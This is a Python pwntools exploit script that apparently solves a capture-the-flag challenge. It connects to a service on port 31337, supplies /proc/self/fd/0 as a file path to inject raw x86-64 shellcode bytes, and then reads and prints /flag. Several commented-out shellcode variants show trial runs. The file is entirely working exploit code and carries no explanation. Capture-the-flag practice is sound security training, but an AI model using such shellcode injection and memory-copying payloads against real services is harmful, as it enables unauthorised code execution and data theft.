#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

#io = process('./challenge')
io.sendlineafter(b"Choice: ", b'1')
io.sendlineafter(b"> ", b"/proc/self/fd/0")
io.send(b'\x43' * 0x50 + b"\x48\x8b\x44\x24\x30\x48\x89\xd3\x48\xc7\xc1\x40\x00\x00\x00\x8a\x54\x0b\xc0\x88\x14\x08\x48\xff\xc1\x48\x81\xf9\x90\x00\x00\x00\x76\xed\xc3")

io.sendlineafter(b"Choice: ", b'1')
io.sendlineafter(b"> ", b"/flag")

io.sendlineafter(b"Choice: ", b'1')
io.sendlineafter(b"> ", b"/flag")
#io.interactive()

io.sendline(b'1')
io.sendlineafter(b"> ", b"/proc/self/fd/0")
#io.sendline(b"\x48\x8b\x44\x24\x30\x48\x81\xea\x00\x40\x00\x00\x48\x89\xd3\x48\xc7\xc1\x40\x00\x00\x00\x8a\x54\x0b\xc0\x88\x14\x08\x48\xff\xc1\x48\x81\xf9\x90\x00\x00\x00\x76\xed\xc3")
#io.sendline(b"\x48\x8b\x44\x24\x30\x48\x81\xea\x00\x40\x00\x00\x48\x89\xd3\x48\xc7\xc1\x40\x00\x00\x00\x8a\x54\x0b\xc0\x88\x14\x08\x48\xff\xc1\x48\x81\xf9\x80\x00\x00\x00\x76\xed\xc3")

#io.sendline(b"\x48\x8b\x44\x24\x30\x48\x81\xea\x00\x40\x00\x00\x48\x89\xd3\x48\xc7\xc1\x0c\x00\x00\x00\x8a\x54\x0b\xf4\x88\x14\x08\x48\xff\xc1\x48\x83\xf9\x4c\x76\xf0\xc3")
io.sendline(b"\x48\x8b\x44\x24\x30\x48\x81\xea\x00\x20\x00\x00\x48\x89\xd3\x48\xc7\xc1\x0c\x00\x00\x00\x8a\x54\x0b\xf4\x88\x14\x08\x48\xff\xc1\x48\x83\xf9\x4c\x76\xf0\xc3")
io.recvuntil(b'Choice')
io.sendline('2')
print(io.recvuntil('Choice:').decode(), flush=True)
